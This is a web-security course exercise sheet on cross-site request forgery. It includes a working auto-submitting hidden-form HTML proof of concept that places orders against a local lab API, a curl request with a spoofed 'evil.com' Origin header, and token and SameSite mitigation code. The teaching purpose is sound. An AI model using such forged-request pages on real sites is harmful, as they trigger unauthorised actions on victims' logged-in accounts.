# Week 06: Cross-Site Request Forgery (CSRF)

## Learning Objectives
- Understand how CSRF attacks work
- Craft CSRF exploits
- Implement CSRF tokens and SameSite cookies

## Exercises

### Exercise 1: CSRF on Vulnerable API
The vulnerable API uses `cors({ origin: true, credentials: true })`, making it vulnerable to CSRF from any origin.

Create an HTML page that performs a CSRF attack:

```html
<html>
<body>
  <h1>Click this innocent page!</h1>
  <form id="csrf-form" action="http://localhost:8080/products/order" method="POST">
    <input type="hidden" name="product_id" value="3" />
    <input type="hidden" name="quantity" value="100" />
  </form>
  <script>
    // If the victim is logged in, their cookies/auth will auto-send
    document.getElementById("csrf-form").submit();
  </script>
</body>
</html>
```

Save this as `csrf.html` and open it while logged into the vulnerable API.

**Questions:**
- Did the order go through without the victim's knowledge?
- What prevented the attack (if anything)?
- How does the CORS configuration contribute to the vulnerability?

### Exercise 2: CSRF in Juice Shop
Find and exploit CSRF vulnerabilities in Juice Shop:
- Check if state-changing requests validate origin
- Test if CSRF tokens are used in forms
- Look for CORS misconfigurations

### Exercise 3: Bypassing Origin Checks
Test if the API has weak origin validation:

```bash
# Try with a spoofed origin header
curl -X POST http://localhost:8080/products/order \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Origin: https://evil.com" \
  -d '{"product_id":1,"quantity":1}'
```

**Questions:**
- Does the API validate the Origin header?
- What would be a secure CORS policy?
- How does SameSite=Strict help?

### Exercise 4: Mitigation

**Solution 1: CSRF Tokens**
```javascript
const crypto = require("crypto");

function generateCSRFToken(req, res, next) {
  if (!req.session.csrfToken) {
    req.session.csrfToken = crypto.randomBytes(32).toString("hex");
  }
  res.locals.csrfToken = req.session.csrfToken;
  next();
}
```

**Solution 2: SameSite Cookies**
```javascript
app.use(require("cookie-session")({
  name: "session",
  sameSite: "strict",
}));
```

## Deliverable
- Create a working CSRF PoC page
- Demonstrate a cross-origin state-changing request
- Document CSRF countermeasures
